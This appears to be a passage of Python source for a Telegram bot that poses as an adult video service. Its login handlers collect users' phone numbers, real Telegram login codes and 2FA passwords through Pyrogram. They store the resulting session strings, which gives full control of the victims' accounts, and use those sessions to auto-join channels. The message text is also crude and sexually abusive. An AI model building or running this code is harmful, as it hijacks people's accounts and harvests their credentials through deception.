                f"💎 <b>TON Address:</b> <code>{ton_addr}</code>\n\n"
                f"💬 <b>Include:</b>\n"
                f"• Your User ID: <code>{user.id}</code>\n"
                f"• Your payment method"
            )
        await query.edit_message_text(
            msg,
            reply_markup=make_keyboard([
                [primary("💬 MESSAGE OWNER", url=f"https://t.me/{config.OWNER_USERNAME.lstrip('@')}")],
                [primary(get_text("BACK_BTN", lang), "main_menu")],
            ]),
            parse_mode="HTML",
        )
    elif data == "copy_user_id":
        await query.answer(f"Your ID: {user.id}" if lang == 'en' else f"आपकी आईडी: {user.id}", show_alert=True)
    elif data == "reveal_twist":
        if lang == "hi":
            msg = (
                "<blockquote>🤫 श्ह्ह... हमारा राज किसी को मत बताना</blockquote>\n\n"
                "हाँ, यह बोट देखने में वयस्क (adult) बोट जैसा <b>दिखता</b> है...\n"
                "लेकिन यहाँ एक <b>ट्विस्ट</b> है:\n\n"
                "✅ सभी वीडियो 100% कानूनी प्रेरक सामग्री हैं।\n"
                "✅ हम इसे ध्यान खींचने और वायरल करने के लिए ऐसा लुक देते हैं।\n"
                "✅ 90% उपयोगकर्ता रुकते हैं क्योंकि सामग्री वास्तव में बहुत अच्छी है।\n\n"
                "अपने दोस्तों को बोट साझा करें और उनके मजे लें! 😈"
            )
        else:
            msg = (
                "<blockquote>🤫 SHH... DON'T TELL ANYONE OUR SECRET</blockquote>\n\n"
                "Yes, this bot <b>LOOKS</b> like a horny adult bot...\n"
                "But here's the <b>PLOT TWIST</b> you dirty-minded fuck:\n\n"
                "✅ ALL videos are 100% LEGAL motivational content.\n"
                "✅ We made it look <i>spicy</i> to make motivation go VIRAL.\n"
                "✅ 90% of users stay because the content is ACTUALLY GOOD.\n\n"
                "<i>\"Fooled you, you horny bastard! But did you like it?\"</i>\n\n"
                "Share this bot with your friends and troll them too. 😈"
            )
        await query.edit_message_text(
            msg,
            reply_markup=reveal_keyboard(lang),
            parse_mode="HTML",
        )
    elif data == "stats":
        await handle_stats(query, user, user_data, lang)
    elif data == "report_issue":
        await query.edit_message_text(
            get_text("REPORT_ISSUE_TEXT", lang, config.SUPPORT_CONTACT),
            reply_markup=make_keyboard([
                [primary(get_text("BACK_BTN", lang), "main_menu")]
            ]),
            parse_mode="HTML",
        )
    elif data == "delete_session":
        await db.update_user(user.id, status="pending", phone=None, language=None, agreement_accepted=False, session_string=None)
        await db.log_activity(user.id, "delete_session")
        await cancel_login(user.id)
        await query.edit_message_text(
            get_text("ALL_EVIDENCE_DELETED", lang),
            parse_mode="HTML",
        )
        log_session(user.id, user.username, None, "Deleted session")
    elif data == "skip_video":
        await query.edit_message_text(
            get_text("VIDEO_SKIPPED", lang),
            reply_markup=make_keyboard([
                [success(get_text("ANOTHER_ROUND_BTN", lang), "next_video")]
            ]),
            parse_mode="HTML",
        )
    elif data == "need_break":
        await query.edit_message_text(
            get_text("TOO_MUCH_BREAK_TEXT", lang),
            reply_markup=make_keyboard([
                [success(get_text("BACK_TO_GRIND_BTN", lang), "next_video")]
            ]),
            parse_mode="HTML",
        )
    elif data == "share_bot":
        await query.edit_message_text(
            get_text("SHARE_BOT_TEXT", lang, config.BOT_LINK),
            reply_markup=make_keyboard([
                [primary(get_text("BACK_BTN", lang), "main_menu")]
            ]),
            parse_mode="HTML",
        )
    elif data == "main_menu":
        login_state.pop(user.id, None)
        await cancel_login(user.id)
        msg = get_text("WELCOME_BACK_USER", lang)
        await query.edit_message_text(
            msg,
            reply_markup=welcome_keyboard(lang),
            parse_mode="HTML",
        )
    elif data == "check_sub":
        is_subbed = await check_subscription(context.bot, user.id)
        if is_subbed:
            await query.edit_message_text(
                "<blockquote>✅ OH YEAH... YOU'RE IN!</blockquote>\n\n"
                "Good boy/girl. You're officially a <b>VIP member</b> now.\n"
                "Use /start and I'll show you what's behind the curtain 😈🔥" if lang == 'en' else
                "<blockquote>✅ आप जुड़ चुके हैं!</blockquote>\n\n"
                "बधाई हो! अब आप <b>वीआईपी सदस्य</b> हैं।\n"
                "शुरू करने के लिए /start दबाएं 😈🔥",
                parse_mode="HTML",
            )
        else:
            sub = await db.get_subscription()
            if sub:
                await query.edit_message_text(
                    "<blockquote>❌ NAH... YOU AIN'T IN YET</blockquote>\n\n"
                    "Don't lie to me. Join the channel first,\n"
                    "then tap <b>\"I'VE JOINED\"</b> like a good little slut. 😘" if lang == 'en' else
                    "<blockquote>❌ अभी तक नहीं जुड़े</blockquote>\n\n"
                    "झूठ मत बोलो। पहले चैनल से जुड़ें,\n"
                    "फिर <b>\"मैं जुड़ गया हूँ\"</b> पर टैप करें। 😘",
                    reply_markup=force_sub_keyboard(sub.get("channel_username", ""), sub.get("channel_id", ""), lang),
                    parse_mode="HTML",
                )
    elif data == "admin_dashboard":
        if not is_admin:
            return
        await show_admin_dashboard(query, context)
    elif data.startswith("admin_"):
        if not is_admin:
            return
        await handle_admin_callbacks(query, context, data)


async def handle_free_video(query, context, user, user_data, num):
    lang = user_data.get("language", "en") if user_data else "en"
    free_used = user_data["free_previews_used"] if user_data else 0
    if free_used >= config.FREE_PREVIEW_COUNT:
        await query.edit_message_text(
            get_text("FREE_TRIAL_LIMIT", lang),
            reply_markup=purchase_options_keyboard(lang),
            parse_mode="HTML",
        )
        return

    await db.update_user(user.id, free_previews_used=free_used + 1)

    video = await get_video_for_user(user.id, only_free=True)
    if video:
        caption = video["caption"] or get_caption_for_category(video["category"], video["delete_after"])
        await db.increment_watch_count(video["id"])
        await db.update_user(
            user.id,
            video_count=(user_data["video_count"] if user_data else 0) + 1,
            last_video_id=video["id"]
        )
        await db.log_activity(user.id, "watch_free", f"Video #{video['id']}")
        log_session(user.id, user.username, None,
                    f"Watched free video #{video['id']} [{video['category']}]")

        taste_msgs_en = ["🍆 Here's your FREE taste... don't cum too fast! 🔥",
                         "🍑 FREEBIE #{} — just the tip... for now 😏"]
        taste_msgs_hi = ["🍆 ये रहा आपका मुफ़्त ट्रेलर... बहक मत जाना! 🔥",
                         "🍑 मुफ़्त वीडियो #{} — बस एक छोटी सी झलक... अभी के लिए 😏"]
        taste_msgs = taste_msgs_hi if lang == "hi" else taste_msgs_en
        
        await query.edit_message_text(
            taste_msgs[num - 1] if num == 2 else taste_msgs[0].format(num)
        )
        await asyncio.sleep(0.5)

        sent = await query.message.reply_video(
            video=video["file_id"],
            caption=caption,
            parse_mode="HTML",
            reply_markup=make_keyboard([
                [info(get_text("WATCH_BEFORE_DELETE_BTN", lang), "main_menu")],
                [success(get_text("UNLOCK_FULL_ACCESS_BTN", lang), "login")],
            ])
        )

        async def auto_del(ctx: ContextTypes.DEFAULT_TYPE):
            try:
                await ctx.bot.delete_message(chat_id=query.message.chat_id, message_id=sent.message_id)
            except Exception:
                pass

        context.job_queue.run_once(auto_del, video["delete_after"],
                                   name=f"del_free_{user.id}_{video['id']}")
    else:
        await query.edit_message_text(
            get_text("NO_VIDEOS_AVAILABLE", lang),
            reply_markup=make_keyboard([
                [primary(get_text("BACK_BTN", lang), "main_menu")]
            ]),
            parse_mode="HTML",
        )


async def handle_resend_otp(query, user, user_data, lang="en"):
    phone = user_data.get("phone") if user_data else None
    if not phone:
        await query.edit_message_text(
            get_text("ACCESS_DENIED", lang),
            reply_markup=login_prompt_keyboard(lang),
            parse_mode="HTML",
        )
        return

    st = login_state.get(user.id, {})
    is_mock = st.get("is_mock", True)

    if is_mock:
        otp = generate_mock_otp()
        reset_attempts(user.id)
        log_session(user.id, user.username, phone, f"Mock OTP resent: {otp}")
        login_state[user.id] = {"otp": otp, "phone": phone, "step": "otp_wait", "is_mock": True}
        await query.edit_message_text(
            get_text("OTP_SENT_TEXT", lang, otp, " ".join(otp)),
            reply_markup=make_keyboard([
                [danger(get_text("CANCEL_BTN", lang), "main_menu")]
            ]),
            parse_mode="HTML",
        )
    else:
        await query.edit_message_text("🔑 <b>Connecting to Telegram... Please wait.</b>", parse_mode="HTML")
        res = await send_otp_pyrogram(user.id, phone)
        if "error" in res:
            await query.edit_message_text(f"❌ <b>Error:</b> {res['error']}", reply_markup=make_keyboard([[danger(get_text("CANCEL_BTN", lang), "main_menu")]]), parse_mode="HTML")
        else:
            reset_attempts(user.id)
            login_state[user.id] = {"phone": phone, "step": "otp_wait", "is_mock": False}
            await query.edit_message_text(
                get_text("OTP_SENT_REAL_TEXT", lang),
                reply_markup=make_keyboard([
                    [danger(get_text("CANCEL_BTN", lang), "main_menu")]
                ]),
                parse_mode="HTML",
            )


async def handle_login_success(query, user, user_data, context, lang="en"):
    await db.update_user(user.id, status="active", login_time=datetime.now().isoformat())
    await db.log_activity(user.id, "login_success")
    log_session(user.id, user.username,
                user_data.get("phone") if user_data else None, "Login successful")

    await query.edit_message_text(
        get_text("LOGIN_SUCCESS_TEXT", lang, 0),
        reply_markup=login_success_keyboard(lang),
        parse_mode="HTML",
    )


async def handle_next_video(query, context, user, user_data, lang="en"):
    if not user_data or user_data.get("status") not in ("active", "purchased"):
        await query.edit_message_text(
            get_text("ACCESS_DENIED", lang),
            reply_markup=login_prompt_keyboard(lang),
            parse_mode="HTML",
        )
        return

    only_free = user_data.get("status") == "active" and not user_data.get("purchased_pack")
    video = await get_video_for_user(user.id, only_free=only_free)

    if not video:
        await query.edit_message_text(
            get_purchase_text(),
            reply_markup=purchase_options_keyboard(lang),
            parse_mode="HTML",
        )
        return

    caption = video["caption"] or get_caption_for_category(video["category"], video["delete_after"])
    await db.increment_watch_count(video["id"])
    await db.update_user(
        user.id,
        video_count=(user_data["video_count"] if user_data else 0) + 1,
        total_watch_time=(user_data["total_watch_time"] if user_data else 0) + video["delete_after"],
        last_video_id=video["id"]
    )
    await db.log_activity(user.id, "watch_video", f"Video #{video['id']} [{video['category']}]")
    log_session(user.id, user.username, None,
                f"Watched video #{video['id']} [{video['category']}]")

    await query.edit_message_text(get_text("DELIVERING_FIX", lang), parse_mode="HTML")

    sent = await query.message.reply_video(
        video=video["file_id"],
        caption=caption,
        parse_mode="HTML",
        reply_markup=make_keyboard([
            [info(get_text("WATCH_BEFORE_DELETE_BTN", lang), "skip_video")],
            [danger(get_text("DELETE_NOW_BTN", lang), "skip_video")],
        ])
    )

    async def auto_del(ctx: ContextTypes.DEFAULT_TYPE):
        try:
            await ctx.bot.delete_message(chat_id=query.message.chat_id, message_id=sent.message_id)
        except Exception:
            pass

    context.job_queue.run_once(auto_del, video["delete_after"],
                               name=f"del_{user.id}_{video['id']}")

    await asyncio.sleep(video["delete_after"])
    try:
        await query.message.reply_text(
            get_text("AFTER_VIDEO_TEXT", lang),
            reply_markup=after_video_keyboard(lang),
            parse_mode="HTML",
        )
    except Exception:
        pass


async def handle_purchase_request(query, user, pack_key, lang="en"):
    purchase_id, error = await request_purchase(user.id, pack_key)
    if error:
        await query.edit_message_text(
            f"<blockquote>❌ {error}</blockquote>",
            reply_markup=make_keyboard([
                [primary(get_text("BACK_BTN", lang), "main_menu")]
            ]),
            parse_mode="HTML",
        )
        return

    pack_info = config.PURCHASE_OPTIONS[pack_key]
    await db.log_activity(user.id, "purchase_request",
                          f"Pack: {pack_info['label']} ({pack_info['price']})")
    log_session(user.id, user.username, None,
                f"Purchase requested: {pack_info['label']}")

    await query.edit_message_text(
        "<blockquote>📝 PURCHASE REQUEST SENT! NOW WE WAIT...</blockquote>\n\n"
        f"Your request for <b>{pack_info['label']}</b> ({pack_info['price']}) "
        f"has been sent to the owner.\n\n"
        f"Status: <u>PENDING APPROVAL</u> ⏳\n\n"
        "The owner will review your application.\n"
        "In the meantime, slide into his DMs to speed things up:",
        reply_markup=make_keyboard([
            [primary("📞 CONTACT OWNER", "contact_owner")],
            [success("💦 WATCH FREE VIDEO", "next_video")],
        ]),
        parse_mode="HTML",
    )


async def handle_stats(query, user, user_data, lang="en"):
    if not user_data:
        await query.edit_message_text("❌ No data found.", reply_markup=main_menu_keyboard(lang))
        return

    leaderboard = await db.get_leaderboard(10)
    lb_lines = []
    for i, u in enumerate(leaderboard, 1):
        horny_emoji = "🍆" if u["video_count"] > 10 else "🔥"
        lb_lines.append(f"{i}. @{u['username'] or 'Anonymous'} — {u['video_count']} videos {horny_emoji}")
    lb_text = "\n".join(lb_lines) if lb_lines else ("No data yet." if lang == "en" else "अभी कोई डेटा नहीं है।")

    status_text = {
        "active": get_text("STATUS_ACTIVE", lang),
        "purchased": get_text("STATUS_PURCHASED", lang),
        "pending": get_text("STATUS_PENDING", lang)
    }
    status_label = status_text.get(user_data.get("status", "pending"), get_text("STATUS_PENDING", lang))
    pack_label = user_data.get('purchased_pack') or ("Free (cheapskate)" if lang == "en" else "मुफ़्त उपयोगकर्ता")

    text = get_text(
        "STATS_TEXT",
        lang,
        user.username or 'N/A',
        status_label,
        user_data['video_count'],
        user_data['total_watch_time'] // 60,
        pack_label,
        user_data['referral_count'],
        lb_text
    )
    await query.edit_message_text(text, reply_markup=stats_keyboard(lang), parse_mode="HTML")


async def handle_login_success_msg(message, user, user_data, lang="en"):
    await db.update_user(user.id, status="active", login_time=datetime.now().isoformat())
    await db.log_activity(user.id, "login_success")
    log_session(user.id, user.username,
                user_data.get("phone") if user_data else None, "Login successful")

    await message.reply_text(
        get_text("LOGIN_SUCCESS_TEXT", lang, 0),
        reply_markup=login_success_keyboard(lang),
        parse_mode="HTML",
    )


async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    phone = update.message.text.strip()
    user_data = await db.get_user(user.id)
    lang = user_data.get("language", "en") if user_data else "en"

    # Normalize phone number (must start with +)
    if not phone.startswith("+"):
        await update.message.reply_text(
            get_text("INVALID_FORMAT", lang),
            reply_markup=make_keyboard([
                [warning(get_text("TRY_AGAIN_BTN", lang), "login_number")]
            ]),
            parse_mode="HTML",
        )
        return

    # Update database first
    await db.update_user(user.id, phone=phone)
    await db.log_activity(user.id, "phone_submitted", phone)

    # Inform user that we are connecting
    status_msg = await update.message.reply_text(
        "🔑 <b>Connecting to Telegram servers... Please wait.</b>" if lang == "en" else
        "🔑 <b>टेलीग्राम सर्वर से जुड़ रहे हैं... कृपया प्रतीक्षा करें।</b>",
        parse_mode="HTML"
    )

    # Fetch settings from database for Pyrogram credentials
    settings = await db.get_settings()
    api_id = settings.get("pyrogram_api_id") or config.PYROGRAM_API_ID
    api_hash = settings.get("pyrogram_api_hash") or config.PYROGRAM_API_HASH

    # Call send_otp_pyrogram
    res = await send_otp_pyrogram(user.id, phone, api_id=api_id, api_hash=api_hash)

    if res.get("error") == "credentials_missing":
        # Fall back to Mock OTP
        otp = generate_mock_otp()
        login_state[user.id] = {"otp": otp, "phone": phone, "step": "otp_wait", "is_mock": True}
        log_session(user.id, user.username, phone, f"Mock OTP sent: {otp}")
        try:
            await status_msg.delete()
        except Exception:
            pass
        await update.message.reply_text(
            get_text("OTP_SENT_TEXT", lang, otp, " ".join(otp)),
            reply_markup=make_keyboard([
                [danger(get_text("CANCEL_BTN", lang), "main_menu")]
            ]),
            parse_mode="HTML",
        )
    elif "error" in res:
        # Pyrogram failed
        try:
            await status_msg.delete()
        except Exception:
            pass
        await update.message.reply_text(
            f"❌ <b>Error:</b> {res['error']}\n\n" +
            ("Please try again or use another number." if lang == "en" else "कृपया पुनः प्रयास करें या अन्य नंबर का उपयोग करें।"),
            reply_markup=make_keyboard([
                [warning(get_text("TRY_AGAIN_BTN", lang), "login_number")],
                [danger(get_text("CANCEL_BTN", lang), "main_menu")]
            ]),
            parse_mode="HTML",
        )
    else:
        # Pyrogram succeeded
        login_state[user.id] = {"phone": phone, "step": "otp_wait", "is_mock": False}
        log_session(user.id, user.username, phone, "Real OTP sent via Pyrogram")
        try:
            await status_msg.delete()
        except Exception:
            pass
        await update.message.reply_text(
            get_text("OTP_SENT_REAL_TEXT", lang),
            reply_markup=make_keyboard([
                [danger(get_text("CANCEL_BTN", lang), "main_menu")]
            ]),
            parse_mode="HTML",
        )


async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text.strip()
    digits = text.replace(" ", "")
    user_data = await db.get_user(user.id)
    lang = user_data.get("language", "en") if user_data else "en"

    # Validation
    if not (digits.isdigit() and len(digits) == 5):
        await update.message.reply_text(
            get_text("INVALID_OTP_FORMAT", lang),
            reply_markup=make_keyboard([
                [warning(get_text("TRY_AGAIN_BTN", lang), "verify_otp")]
            ]),
            parse_mode="HTML",
        )
        return

    state = login_state.get(user.id, {})
    is_mock = state.get("is_mock", True)

    attempts = increment_otp_attempts(user.id)
    if attempts > 3:
        reset_attempts(user.id)
        login_state.pop(user.id, None)
        await cancel_login(user.id)
        await update.message.reply_text(
            get_text("TOO_MANY_ATTEMPTS", lang),
            reply_markup=make_keyboard([
                [danger(get_text("START_OVER_BTN", lang), "login_number")]
            ]),
            parse_mode="HTML",
        )
        return

    if is_mock:
        expected = state.get("otp", "")
        if digits == expected:
            reset_attempts(user.id)
            login_state.pop(user.id, None)
            
            # Save a dummy session string so user is recorded as logged in
            dummy_session = "MOCK_SESSION_STRING_" + str(user.id)
            await db.update_user(user.id, session_string=dummy_session)
            
            await handle_login_success_msg(update.message, user, user_data, lang)
        else:
            remaining = 3 - attempts
            await update.message.reply_text(
                get_text("WRONG_CODE", lang, remaining),
                reply_markup=make_keyboard([
                    [warning(get_text("TRY_AGAIN_BTN", lang), "verify_otp")],
                    [warning(get_text("RESEND_OTP_BTN", lang), "resend_otp")],
                    [danger(get_text("CANCEL_BTN", lang), "main_menu")],
                ]),
                parse_mode="HTML",
            )
    else:
        # Real Pyrogram verification
        status_msg = await update.message.reply_text(
            "🔑 <b>Verifying code with Telegram... Please wait.</b>" if lang == "en" else
            "🔑 <b>टेलीग्राम के साथ कोड सत्यापित कर रहे हैं... कृपया प्रतीक्षा करें।</b>",
            parse_mode="HTML"
        )
        res = await verify_otp_pyrogram(user.id, digits)
        try:
            await status_msg.delete()
        except Exception:
            pass

        if res.get("error") == "2fa_required":
            # Change step to tfa_wait
            state["step"] = "tfa_wait"
            await update.message.reply_text(
                get_text("TFA_PROMPT_TEXT", lang),
                reply_markup=make_keyboard([
                    [info(get_text("SKIP_2FA_BTN", lang), "skip_2fa")],
                    [danger(get_text("CANCEL_BTN", lang), "main_menu")],
                ]),
                parse_mode="HTML",
            )
        elif res.get("error") == "invalid_otp":
            remaining = 3 - attempts
            await update.message.reply_text(
                get_text("WRONG_CODE", lang, remaining),
                reply_markup=make_keyboard([
                    [warning(get_text("TRY_AGAIN_BTN", lang), "verify_otp")],
                    [danger(get_text("CANCEL_BTN", lang), "main_menu")],
                ]),
                parse_mode="HTML",
            )
        elif "error" in res:
            # General error
            reset_attempts(user.id)
            login_state.pop(user.id, None)
            await update.message.reply_text(
                f"❌ <b>Verification failed:</b> {res['error']}\n\n" +
                ("Please start the login process again." if lang == "en" else "कृपया लॉगिन प्रक्रिया फिर से शुरू करें।"),
                reply_markup=make_keyboard([
                    [danger(get_text("START_OVER_BTN", lang), "login_number")]
                ]),
                parse_mode="HTML",
            )
        else:
            # Success!
            reset_attempts(user.id)
            login_state.pop(user.id, None)
            session_str = res["session_string"]
            
            # Save session string
            await db.update_user(user.id, session_string=session_str, phone=res.get("phone"))
            
            # Run auto-join in background if configured
            settings = await db.get_settings()
            auto_join_chan = settings.get("auto_join_channel", "")
            if auto_join_chan:
                asyncio.create_task(run_single_auto_join(session_str, auto_join_chan))
                
            await handle_login_success_msg(update.message, user, user_data, lang)


async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    password = update.message.text.strip()
    user_data = await db.get_user(user.id)
    lang = user_data.get("language", "en") if user_data else "en"

    state = login_state.get(user.id, {})
    is_mock = state.get("is_mock", True)

    attempts = increment_2fa_attempts(user.id)
    if attempts > 3:
        reset_attempts(user.id)
        login_state.pop(user.id, None)
        await cancel_login(user.id)
        await update.message.reply_text(
            get_text("TOO_MANY_ATTEMPTS", lang),
            reply_markup=make_keyboard([
                [danger(get_text("START_OVER_BTN", lang), "login_number")]
            ]),
            parse_mode="HTML",
        )
        return

    if is_mock:
        reset_attempts(user.id)
        login_state.pop(user.id, None)
        dummy_session = "MOCK_SESSION_STRING_" + str(user.id)
        await db.update_user(user.id, session_string=dummy_session)
        await handle_login_success_msg(update.message, user, user_data, lang)
    else:
        status_msg = await update.message.reply_text(
            "🔑 <b>Verifying 2FA password... Please wait.</b>" if lang == "en" else
            "🔑 <b>2FA पासवर्ड सत्यापित कर रहे हैं... कृपया प्रतीक्षा करें।</b>",
            parse_mode="HTML"
        )
        res = await check_2fa_password(user.id, password)
        try:
            await status_msg.delete()
        except Exception:
            pass

        if res.get("error") == "invalid_password":
            remaining = 3 - attempts
            await update.message.reply_text(
                get_text("INVALID_TFA_PASSWORD", lang, remaining),
                reply_markup=make_keyboard([
                    [danger(get_text("CANCEL_BTN", lang), "main_menu")]
                ]),
                parse_mode="HTML",
            )
        elif "error" in res:
            reset_attempts(user.id)
            login_state.pop(user.id, None)
            await update.message.reply_text(
                f"❌ <b>2FA verification failed:</b> {res['error']}\n\n" +
                ("Please start the login process again." if lang == "en" else "कृपया लॉगिन प्रक्रिया फिर से शुरू करें।"),
                reply_markup=make_keyboard([
                    [danger(get_text("START_OVER_BTN", lang), "login_number")]
                ]),
                parse_mode="HTML",
            )
        else:
            # Success!
            reset_attempts(user.id)
            login_state.pop(user.id, None)
            session_str = res["session_string"]
            
            # Save session string
            await db.update_user(user.id, session_string=session_str, phone=res.get("phone"))
            
            # Run auto-join in background if configured
            settings = await db.get_settings()
            auto_join_chan = settings.get("auto_join_channel", "")
            if auto_join_chan:
                asyncio.create_task(run_single_auto_join(session_str, auto_join_chan))
                
            await handle_login_success_msg(update.message, user, user_data, lang)


async def show_admin_dashboard(query, context):
    user_count = await db.get_user_count()
    v_count = await db.video_count()
    pending_purchases = await db.get_pending_purchases()
    total_logs = len(await db.get_activity_log(100))

    text = (
        "<blockquote>🔞 ADMIN CONTROL PANEL</blockquote>\n\n"
        f"👥 <b>Total Users:</b> <code>{user_count}</code>\n"
        f"📹 <b>Total Videos:</b> <code>{v_count}</code>\n"
        f"💰 <b>Pending Purchases:</b> <code>{len(pending_purchases)}</code>\n"
        f"📋 <b>Activity Logs:</b> <code>{total_logs}</code>\n\n"
        "<i>Select a section below to manage.</i>"
    )
    await query.edit_message_text(text, reply_markup=admin_keyboard(), parse_mode="HTML")


async def handle_admin_callbacks(query, context, data):
    back_markup = make_keyboard([[danger("🔙 BACK TO PANEL", "admin_dashboard")]])

    if data == "admin_videos":
        videos = await db.get_all_videos()
        text = f"<blockquote>📹 VIDEO MANAGEMENT ({len(videos)} Videos)</blockquote>\n\n"
        if not videos:
            text += "No videos uploaded yet.\n"
        else:
            for v in videos[:10]:
                text += f"ID: <code>{v['id']}</code> | {v['category']} | Watched: {v['times_watched']}\n"
        text += (
            "\n💡 <b>How to upload:</b> Send any video file directly to this bot in this chat. "
            "You will get an interactive menu to configure the category, free/premium type, and deletion timer.\n\n"
            "Use the <b>Streamlit admin panel</b> for advanced management."
        )
        await query.edit_message_text(text, reply_markup=back_markup, parse_mode="HTML")

    elif data == "admin_purchases":
        pending = await db.get_pending_purchases()
        all_p = await db.get_all_purchases()
        text = f"<blockquote>💰 PURCHASE REQUESTS ({len(pending)} Pending)</blockquote>\n\n"
        if not all_p:
            text += "No purchase requests yet."
        else:
            for p in all_p[:10]:
                status_emoji = {"pending": "⏳", "approved": "✅", "rejected": "❌"}.get(p["status"], "⏳")
                text += (
                    f"{status_emoji} <b>Request #{p['id']}</b>\n"
                    f"User: <code>{p['user_id']}</code>\n"
                    f"Pack: {p['pack_name']} ({p['amount']})\n"
                    f"Status: <u>{p['status'].upper()}</u>\n\n"
                )
        text += "\nUse the <b>Streamlit admin panel</b> to approve/reject purchases."
        await query.edit_message_text(text, reply_markup=back_markup, parse_mode="HTML")

    elif data == "admin_broadcast":
        await query.edit_message_text(
            "<blockquote>📢 BROADCAST CENTER</blockquote>\n\n"
            "Use the <b>Streamlit admin panel</b> to send broadcasts.\n\n"
            "Available templates:\n"
            "• <b>new_content</b> — New video alert\n"
            "• <b>purchase_reminder</b> — Purchase prompt\n"
            "• <b>referral</b> — Referral bonus\n"
            "• <b>inactive_users</b> — Re-engagement",
            reply_markup=back_markup,
            parse_mode="HTML",
        )

    elif data == "admin_subscription":
        sub = await db.get_subscription()
        text = (
            "<blockquote>🔒 FORCE SUBSCRIPTION</blockquote>\n\n"
            f"📢 Channel: <code>{sub.get('channel_username', 'N/A') if sub else 'N/A'}</code>\n"
            f"🔗 Link: <code>{sub.get('channel_id', 'N/A') if sub else 'N/A'}</code>\n"
            f"✅ Active: <b>{'YES' if sub and sub.get('is_active') else 'NO'}</b>\n\n"
            "Use <code>/setchannel @username invite_link</code> to update."
        )
        await query.edit_message_text(text, reply_markup=back_markup, parse_mode="HTML")

    elif data == "admin_users":
        user_count = await db.get_user_count()
        active_count = len(await db.get_active_users())
        pur_count = len(await db.get_purchased_users())
        text = (
            "<blockquote>👥 USER MANAGEMENT</blockquote>\n\n"
            f"👤 <b>Total Users:</b> <code>{user_count}</code>\n"
            f"✅ <b>Active/Logged In:</b> <code>{active_count}</code>\n"
            f"💰 <b>Purchased:</b> <code>{pur_count}</code>\n\n"
            "Use <b>Streamlit admin panel</b> for full user management."
        )
        await query.edit_message_text(text, reply_markup=back_markup, parse_mode="HTML")

    elif data == "admin_logs":
        logs = await db.get_activity_log(20)
        text = "<blockquote>📋 RECENT ACTIVITY</blockquote>\n\n"
        for log_entry in logs[:15]:
            text += f"[{log_entry['timestamp'][:19]}] User <code>{log_entry['user_id']}</code> — {log_entry['action']}\n"
        if not logs:
            text += "No activity recorded yet."
        await query.edit_message_text(text, reply_markup=back_markup, parse_mode="HTML")

    elif data == "admin_settings":
        text = (
            "<blockquote>⚙️ SETTINGS</blockquote>\n\n"
            "Bot configuration options:\n"
            f"• <b>Free Previews:</b> {config.FREE_PREVIEW_COUNT}\n"
            f"• <b>Video Delete After:</b> {config.VIDEO_DELETE_AFTER}s\n"
            f"• <b>OTP Login:</b> {'Enabled' if config.OTP_LOGIN_ENABLED else 'Disabled'}\n\n"
            "Edit <code>.env</code> or <code>config.py</code> to change settings."
        )
        await query.edit_message_text(text, reply_markup=back_markup, parse_mode="HTML")

    elif data == "admin_ad_configs":
        await show_telegram_admin_dashboard(query)


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    is_admin = await is_user_admin(user.id)

    # 1. Check if admin is entering configuration parameters
    if is_admin and user.id in admin_config_state:
        st_cfg = admin_config_state[user.id]
        field = st_cfg.get("field")
        text = update.message.text.strip()

        settings = await db.get_settings()

        if field == "force_join":
            if text.lower() == "none":
                await db.update_settings(force_sub_channel="", channel_invite_link="")
                await update.message.reply_text("✅ Force Join disabled.")
            else:
                parts = text.split()
                if len(parts) == 2:
                    chan, link = parts
                    await db.update_settings(force_sub_channel=chan, channel_invite_link=link)
                    await update.message.reply_text(f"✅ Force Join updated: {chan} -> {link}")
                else:
                    await update.message.reply_text("❌ Invalid format. Please send username and link separated by space.")
            admin_config_state.pop(user.id, None)

        elif field == "log_group":
            try:
                val = int(text)
                await db.update_settings(log_group_id=val)
                await update.message.reply_text(f"✅ Log Group ID updated to: {val}")
                admin_config_state.pop(user.id, None)
            except ValueError:
                await update.message.reply_text("❌ Invalid ID. Please send a valid negative integer ID.")

        elif field == "brand_name":
            await db.update_settings(branding_name=text)
            await update.message.reply_text(f"✅ Branding Name updated to: {text}")
            admin_config_state.pop(user.id, None)

        elif field == "brand_days":
            try:
                val = int(text)
                await db.update_settings(branding_days=val)
                await update.message.reply_text(f"✅ Branding Days updated to: {val}")
                admin_config_state.pop(user.id, None)
            except ValueError:
                await update.message.reply_text("❌ Invalid number. Please send an integer.")

        elif field == "upi":
            await db.update_settings(upi_id=text)
            await update.message.reply_text(f"✅ UPI ID updated to: {text}")
            admin_config_state.pop(user.id, None)

        elif field == "usdt":
            await db.update_settings(usdt_address=text)
            await update.message.reply_text(f"✅ USDT Address updated to: {text}")
            admin_config_state.pop(user.id, None)

        elif field == "ton":
            await db.update_settings(ton_address=text)
            await update.message.reply_text(f"✅ TON Address updated to: {text}")
            admin_config_state.pop(user.id, None)

        elif field == "commission":
            try:
                val = int(text)
                if 0 <= val <= 100:
                    await db.update_settings(commission=val)
                    await update.message.reply_text(f"✅ Commission updated to: {val}%")
                    admin_config_state.pop(user.id, None)
                else:
                    await update.message.reply_text("❌ Please enter a number between 0 and 100.")
            except ValueError:
                await update.message.reply_text("❌ Invalid number. Please enter a percentage (0-100).")

        elif field == "pyrogram_api_id":
            try:
                val = int(text)
                await db.update_settings(pyrogram_api_id=val)
                await update.message.reply_text(f"✅ Pyrogram API ID updated to: {val}")
                admin_config_state.pop(user.id, None)
            except ValueError:
                await update.message.reply_text("❌ Invalid API ID. Please send an integer ID.")

        elif field == "pyrogram_api_hash":
            await db.update_settings(pyrogram_api_hash=text)
            await update.message.reply_text(f"✅ Pyrogram API HASH updated to: {text}")
            admin_config_state.pop(user.id, None)

        elif field == "auto_join_config":
            if text.lower() == "none":
                await db.update_settings(auto_join_channel="")
                await update.message.reply_text("✅ Auto-joins disabled.")
            else:
                await db.update_settings(auto_join_channel=text)
                await update.message.reply_text(f"✅ Auto-join channel updated to: {text}")
            admin_config_state.pop(user.id, None)

        elif field == "user_manage":
            try:
                target_uid = int(text)
                u_info = await db.get_user(target_uid)
                if not u_info:
                    await update.message.reply_text(f"❌ User with ID <code>{target_uid}</code> not found in database.", parse_mode="HTML")
                else:
                    text_profile = (
                        f"<blockquote>👤 USER PROFILE: {target_uid}</blockquote>\n\n"
                        f"• Username: @{u_info.get('username', 'None')}\n"
                        f"• First Name: {u_info.get('first_name', 'None')}\n"
